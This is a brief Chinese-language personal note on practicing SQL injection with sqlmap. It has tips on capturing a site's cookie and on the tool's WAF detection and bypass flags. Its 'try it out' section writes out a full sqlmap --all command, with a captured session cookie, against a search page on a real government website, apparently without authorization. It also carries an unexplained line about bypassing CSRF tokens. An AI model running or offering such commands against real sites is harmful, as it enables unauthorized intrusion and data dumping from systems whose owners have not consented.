我们跟随 [SQL注入之SQLmap入门 ](http://www.freebuf.com/articles/web/29942.html) 来做一个练习

## 一、 小技巧
### 1.1、 获取当前网站 Cookie
1. __不推荐__ 的我们可以通过抓包工具抓取并获取。
2. 使用 foxfire 浏览器自身工具。[Ctrl+Shift+C]->[网络选项卡]->[选中一行]->[右侧查看信息]
    - FoxFire 57.0 (64 位)

## 二、
Enumeration:
- 枚举

Miscellaneous:
- 其他
    - ` --identify-waf ` 探测 `WAF/IPS/IDS`
    - ` --skip-waf ` 绕过 `WAF/IPS/IDS` 并进行测试

## 二、 尝试一下
sqlmap.py --url="http://www.shenze.gov.cn/search.jsp?searchkey=1&field2.x=0&field2.y=0" --cookie="JSESSIONID=989A0AB4384CCDD234DB5B5975430800; Path=/clove/; HttpOnly" --all

JSESSIONID=989A0AB4384CCDD234DB5B5975430800; Path=/clove/; HttpOnly

csrf攻击绕过随机token

## 参考
1. [SQL注入之SQLmap入门 ](http://www.freebuf.com/articles/web/29942.html)
2. [SQLMAP参数介绍](https://www.cnblogs.com/shengulong/p/7404642.html)
3. [SQLMap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
4. [SQLMap用户手册【超详细】](https://www.cnblogs.com/hongfei/p/3872156.html)